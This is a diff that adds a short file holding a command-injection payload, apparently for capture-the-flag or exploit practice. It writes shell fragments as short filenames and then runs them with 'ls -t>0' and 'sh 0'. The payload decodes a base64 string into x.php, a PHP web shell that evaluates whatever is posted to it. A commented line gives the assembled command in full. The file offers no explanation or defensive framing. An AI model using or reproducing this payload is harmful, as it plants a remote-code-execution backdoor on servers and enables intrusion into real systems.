@@ -1,0 +1,22 @@
+>hp
+>x.p\\
+>d\>\\
+>\ -\\
+>e64\\
+>bas\\
+>7\|\\
+>hXSk\\
+>YWF\\
+>1Rb\\
+>BPU\\
+>kX1\\
+>bCg\\
+>XZh\\
+>AgZ\\
+>waH\\
+>PD9\\
+>o\ \\
+>ech\\
+ls -t>0
+sh 0
+#payload:	 echo PD9waHAgZXZhbCgkX1BPU1RbYWFhXSk7|base64 -d>x.php
